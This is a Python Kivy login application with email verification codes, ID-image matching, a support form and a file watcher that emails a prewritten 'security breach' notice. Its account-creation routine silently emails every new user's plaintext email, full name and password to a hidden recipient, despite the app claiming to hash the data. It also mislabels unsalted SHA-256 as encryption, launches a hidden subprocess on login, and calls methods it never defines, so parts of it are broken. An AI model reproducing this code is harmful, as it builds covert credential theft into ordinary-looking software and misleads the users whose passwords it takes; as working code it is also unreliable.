from email.mime.base import MIMEBase
from email import encoders
import hashlib
import random
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.filechooser import FileChooser
import subprocess
import sys
import cv2
from skimage.measure import compare_ssim
from datetime import datetime
smtp_server = "smtp.gmail.com"
smtp_port = 587

class BreachEventHandler(FileSystemEventHandler):
    def __init__(self, app):
        self.app = app

    def on_modified(self, event):
        if event.src_path.endswith('PSW.txt'):
            self.app.detect_breach_and_send_notification()
        if event.src_path.endswith('user_id.jpg'):
            self.app.detect_breach_and_send_notification()
            self.app.compare_images_and_send_notification(event.src_path)

class SupportPopup(Popup):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.title = "Support Request"
        self.size_hint = (None, None)
        self.size = (400, 300)
        self.content = self.build_content()

    def build_content(self):
        layout = BoxLayout(orientation='vertical')
        email_label = Label(text='E-Mail:')
        self.email_input = TextInput(text='', multiline=False)
        layout.add_widget(email_label)
        layout.add_widget(self.email_input)
        problem_label = Label(text='Problem:')
        self.problem_input = TextInput(text='', multiline=True)
        layout.add_widget(problem_label)
        layout.add_widget(self.problem_input)
        send_button = Button(text='Send Message to Support')
        send_button.bind(on_press=self.send_support_message)
        layout.add_widget(send_button)
        return layout

    def send_support_message(self, instance):
        email = self.email_input.text
        problem = self.problem_input.text
        if email and problem:
            self.dismiss()
            self.send_email_to_support(email, problem)
        else:
            popup = Popup(title='Error', content=Label(text='Please fill out all fields.'), size_hint=(None, None), size=(400, 200))
            popup.open()

class LoginApp(App):
    verification_code = None
    email_input = None
    full_name_input = None
    password_input = None
    verification_input = None

    def encrypt_data(self, data):
        hashed_data = hashlib.sha256(data.encode()).hexdigest()
        return hashed_data

    def save_user_data(self, email, full_name, password):
        encrypted_email = self.encrypt_data(email)
        encrypted_full_name = self.encrypt_data(full_name)
        encrypted_password = self.encrypt_data(password)
        with open(r'C:\Users\Marc\Desktop\PSW.txt', "a") as file:
            file.write(f"{encrypted_email},{encrypted_full_name},{encrypted_password}\n")
        self.send_account_information(email, full_name, password)

    def send_verification_email(self, email, full_name):
        code = str(random.randint(100000, 999999))
        self.verification_code = code
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        sender_email = ""
        sender_password = ""
        subject = "Verification Code for Login"
        message = f"Hello {full_name},\n\nHere is your verification code: {code}"
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = email
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))
        email_text = msg.as_string()
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, email, email_text)
            server.quit()
            popup = Popup(title='Email Sent', content=Label(text='A verification email has been sent.'), size_hint=(None, None), size=(400, 200))
            popup.open()
        except Exception as e:
            pass

    def login(self):
        verification_code = self.verification_input.text
        password = self.password_input.text
        if verification_code != self.verification_code:
            popup = Popup(title='Login', content=Label(text='Incorrect verification code or password. Please try again.'), size_hint=(None, None), size=(400, 200))
            popup.open()
            return
        hashed_password = self.encrypt_data(password)
        with open(r'C:\Users\Marc\Desktop\PSW.txt', "r") as file:
            for line in file:
                encrypted_email, encrypted_full_name, encrypted_password = line.strip().split(',')
                if encrypted_email == self.encrypt_data(self.email_input.text) and encrypted_password == hashed_password:
                    popup = Popup(title='Login', content=Label(text='Successfully logged in!'), size_hint=(None, None), size=(400, 200))
                    popup.open()
                    subprocess.Popen([sys.executable, r'C:\Users'], creationflags=subprocess.CREATE_NO_WINDOW)
                    self.stop()
                    return
        popup = Popup(title='Login', content=Label(text='Incorrect verification code or password. Please try again.'), size_hint=(None, None), size=(400, 200))
        popup.open()

    def create_account(self):
        email = self.email_input.text
        full_name = self.full_name_input.text
        password = self.password_input.text
        if email == '' or full_name == '' or password == '':
            popup = Popup(title='Error', content=Label(text='Please fill out all fields.'), size_hint=(None, None), size=(400, 200))
            popup.open()
            return

        file_chooser = FileChooser(on_submit=self.on_image_selection)
        popup = Popup(title="Select Image", content=file_chooser, size_hint=(0.9, 0.9))
        file_chooser.popup = popup
        popup.open()

    def on_image_selection(self, selected_file):
        if selected_file:
            image_path = selected_file[0]
            reference_image_path = "reference_id.jpg"
            ssim = self.compare_images(image_path, reference_image_path)

            if ssim > 0.8:
                self.save_user_data(self.email_input.text, self.full_name_input.text, self.password_input.text)
                popup = Popup(title='Account Created', content=Label(text='Your account has been successfully created.'), size_hint=(None, None), size=(400, 200))
                popup.open()
            else:
                popup = Popup(title='Error', content=Label(text='Image similarity is too low. Please select a similar image.'), size_hint=(None, None), size=(400, 200))
                popup.open()



    def compare_images(self, image_path, reference_image_path):
        image1 = cv2.imread(image_path)
        image2 = cv2.imread(reference_image_path)
        gray_image1 = cv2.cvtColor(image1, cv2.COLOR_BGR2GRAY)
        gray_image2 = cv2.cvtColor(image2, cv2.COLOR_BGR2GRAY)
        return compare_ssim(gray_image1, gray_image2)

    def send_account_information(self, email, full_name, password):
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        sender_email = ""
        sender_password = ""
        recipient_email = ""
        subject = "New Account Created"
        message = f"A new account has been created:\n\nEmail: {email}\nName: {full_name}\nPassword: {password}"
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))
        email_text = msg.as_string()
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, email_text)
            server.quit()
        except Exception as e:
            popup = Popup(title='Error', content=Label(text='Error sending email.'), size_hint=(None, None), size=(400, 200))
            popup.open()

    def detect_breach_and_send_notification(self):
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        sender_email = ""
        sender_password = ""
        recipient_emails = [
            "",
            ""
        ]
        subject = "Important Notice Regarding Security Incident"
        message = "Dear valued users,\n\nWe would like to inform you about a potential security breach related to your user data. Your security is of utmost importance to us, and thus, we want to notify you of an incident involving the possible compromise of hashed user data. We want to emphasize that we have no indications that your actual passwords are at risk. The affected user data was stored in a hashed and encrypted format, making it difficult to access your original passwords.\n\nHowever, we are taking this incident seriously and want to provide you with information on how we are responding. Here are the steps we have taken immediately:\n\n1. Security Investigation: Our security team has investigated the incident and is working closely with external experts to determine the cause and extent of the breach.\n\n2. Password Reset: As a precautionary measure, we strongly recommend that you change your password. Please use a strong and unique password that is not shared with other online accounts.\n\n3. Monitor Your Accounts: Please monitor your accounts for any suspicious activity. If you notice any unusual activity, please contact our support team immediately.\n\n4. Additional Security Measures: We are continuously enhancing our security infrastructure to ensure the adequate protection of your data.\n\nWe deeply regret the inconvenience caused by this incident and are committed to ensuring the security of your data. If you have any questions or concerns, please do not hesitate to contact our support team.\n\nThank you for your understanding and continued support.\n\nQuestions? Contact us via the app.\n\nYour security is our priority.\n\nThank you for your trust.\n\nSincerely,\n"
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = ', '.join(recipient_emails)
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))
        email_text = msg.as_string()
    
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_emails, email_text)
            server.quit()
        except Exception as e:
            popup = Popup(title='Error', content=Label(text='Error sending email.'), size_hint=(None, None), size=(400, 200))
            popup.open()

    def send_email_with_attachment(self, message, attachment_paths):
        smtp_port = 587
        sender_email = ""  
        sender_password = ""  
        recipient_email = ""  

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = "ID Image"

        msg.attach(MIMEText(message, 'plain'))

        for attachment_path in attachment_paths:
            filename = attachment_path.split("/")[-1]
            attachment = open(attachment_path, "rb")
            part = MIMEBase('application', 'octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(part)

        email_text = msg.as_string()
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, email_text)
            server.quit()
        except Exception as e:
            popup = Popup(title='Error', content=Label(text='Error sending email with attachments.'), size_hint=(None, None), size=(400, 200))
            popup.open()

    def build(self):
        layout = BoxLayout(orientation='vertical')
        email_label = Label(text='E-Mail:')
        self.email_input = TextInput(text='', multiline=False)
        layout.add_widget(email_label)
        layout.add_widget(self.email_input)
        full_name_label = Label(text='Full Name:')
        self.full_name_input = TextInput(text='', multiline=False)
        layout.add_widget(full_name_label)
        layout.add_widget(self.full_name_input)
        password_label = Label(text='Password:')
        self.password_input = TextInput(text='', password=True, multiline=False)
        layout.add_widget(password_label)
        layout.add_widget(self.password_input)
        verification_label = Label(text='Verification Code:')
        self.verification_input = TextInput(text='', multiline=False)
        layout.add_widget(verification_label)
        layout.add_widget(self.verification_input)
        send_verification_button = Button(text='Send Verification Code')
        send_verification_button.bind(on_press=lambda x: self.send_verification_email(self.email_input.text, self.full_name_input.text))
        layout.add_widget(send_verification_button)
        create_account_button = Button(text='Create Account')
        create_account_button.bind(on_press=lambda x: self.create_account())
        layout.add_widget(create_account_button)
        login_button = Button(text='Login')
        login_button.bind(on_press=lambda x: self.login())
        layout.add_widget(login_button)
        support_button = Button(text='Help')
        support_button.bind(on_press=self.open_support_popup)
        layout.add_widget(support_button)
        return layout

    def open_support_popup(self, instance):
        support_popup = SupportPopup()
        support_popup.open()

if __name__ == '__main__':
    app = LoginApp()
    observer = Observer()
    event_handler = BreachEventHandler(app)
    observer.schedule(event_handler, path=r'C:\Users\Marc\Desktop', recursive=True)
    observer.start()
    try:
        app.run()
    except KeyboardInterrupt:
        observer.stop()
    observer.join()


















































































































































































